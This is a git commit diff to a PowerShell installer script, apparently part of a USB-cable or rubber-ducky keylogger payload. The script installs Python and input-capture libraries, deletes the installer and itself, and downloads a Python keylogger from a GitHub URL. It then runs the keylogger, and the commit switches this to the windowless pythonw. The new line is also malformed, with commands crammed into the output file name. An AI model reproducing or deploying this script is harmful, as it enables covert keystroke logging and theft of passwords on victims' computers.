1e65fd088ac32b65bccfc22f0694a6ad07726e68
csandoval63 <csandoval63@student.rcc.edu>
2020-05-14 18:10:52 -0700

    Update install_python.ps1

--- Python keylogger stuff with DUCKYscript/install_python.ps1
+++ Python keylogger stuff with DUCKYscript/install_python.ps1
@@ -7,7 +7,4 @@ Remove-Item C:\Users\Public\python-3.8.0.exe
 Remove-Item .\install_python.ps1
 invoke-expression 'cmd /c start powershell -Command { Start-Sleep -Seconds 20; $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User"); python -m pip install --upgrade pip; pip install wheel; pip install pynput; pip install pywin32; pip install requests; pip install easygui }'
 $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
-wget "https://raw.githubusercontent.com/csandoval63/OMGCableStuff/master/Python%20keylogger%20stuff%20with%20DUCKYscript/python%20keylogger%20test.py" -outfile "C:\Users\Public\pythonkl.py"
-$env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
-Start-Sleep -Seconds 40
-python C:\Users\Public\pythonkl.py
+wget "https://raw.githubusercontent.com/csandoval63/OMGCableStuff/master/Python%20keylogger%20stuff%20with%20DUCKYscript/python%20keylogger%20test.py" -outfile "C:\Users\Public\pythonkl.py; $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User"); pythonw C:\Users\Public\pythonkl.py"
